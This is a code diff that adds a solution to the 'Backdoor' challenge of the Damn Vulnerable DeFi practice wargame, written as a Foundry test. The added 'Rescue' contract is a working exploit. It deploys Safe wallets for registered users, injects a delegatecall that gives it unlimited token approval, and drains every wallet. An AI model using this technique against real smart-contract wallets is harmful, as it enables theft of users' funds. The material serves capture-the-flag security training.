@@ -7,6 +7,8 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,10 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Rescue rescue = new Rescue(
+            address(singletonCopy), address(walletFactory), address(walletRegistry), address(token), users, recovery
+        );
+        rescue.recover();
     }
 
     /**
@@ -93,4 +98,56 @@ contract BackdoorChallenge is Test {
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
     }
+}
+
+contract Rescue {
+    Safe singletonCopy;
+    SafeProxyFactory walletFactory;
+    WalletRegistry walletRegistry;
+    DamnValuableToken token;
+    address[] users;
+    address recovery;
+
+    constructor(address _singletonCopy, 
+        address _walletFactory, 
+        address _walletRegistry, 
+        address _token, 
+        address[] memory _users, 
+        address _recovery) 
+    payable {
+        singletonCopy = Safe(payable(_singletonCopy));
+        walletFactory = SafeProxyFactory(_walletFactory);
+        walletRegistry = WalletRegistry(_walletRegistry);
+        token = DamnValuableToken(_token);
+        users = _users;
+        recovery = _recovery;
+    }
+
+    function approve(DamnValuableToken asset, address spender) external {
+        asset.approve(spender, type(uint256).max);
+    }
+
+    function recover() external {
+        for (uint256 i = 0; i < users.length; ++i) {
+            address _owner = users[i];
+            address[] memory owner = new address[](1);
+            owner[0] = _owner;
+
+            bytes memory maliciousData = abi.encodeCall(this.approve, (token, address(this)));
+            
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup, (
+                    owner, 1, address(this), maliciousData, address(0), address(0), 0, payable(address(0))
+                )
+            );
+
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy), initializer, 1, walletRegistry
+            );
+
+            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
+        }
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
 }
